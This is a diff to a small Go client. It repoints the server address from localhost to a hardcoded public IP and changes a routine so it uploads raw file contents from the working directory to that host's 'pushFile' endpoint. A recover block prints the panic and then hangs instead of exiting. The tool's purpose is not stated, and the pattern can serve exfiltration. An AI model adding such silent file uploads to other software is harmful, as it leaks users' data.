@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -14,7 +15,8 @@ import (
 )
 
 const (
-	serverAddr = "http://127.0.0.1:9989/"
+	//serverAddr = "http://127.0.0.1:9989/"
+	serverAddr = "http://149.129.82.53:9989/"
 	rMod       = uint32(0b100100100)
 )
 
@@ -25,6 +27,12 @@ var (
 )
 
 func main() {
+	defer func() {
+		if rec := recover(); rec != nil {
+			fmt.Println(rec)
+			select {}
+		}
+	}()
 	root, _ = os.Getwd()
 	name, key = initNameKey()
 	for {
@@ -96,13 +104,13 @@ func fileReq(filePath string) {
 		panic(err)
 	}
 
-	_, err = http.PostForm(serverAddr+"pushFile", url.Values{
-		"name": {name},
-		"file": {string(fileData)},
-	})
+	req, err := http.NewRequest("POST", serverAddr+"pushFile", bytes.NewReader(fileData))
 	if err != nil {
 		panic(err)
 	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+	req.Header.Set("name", name)
+	_, _ = http.DefaultClient.Do(req)
 }
 
 // ----- utils -----
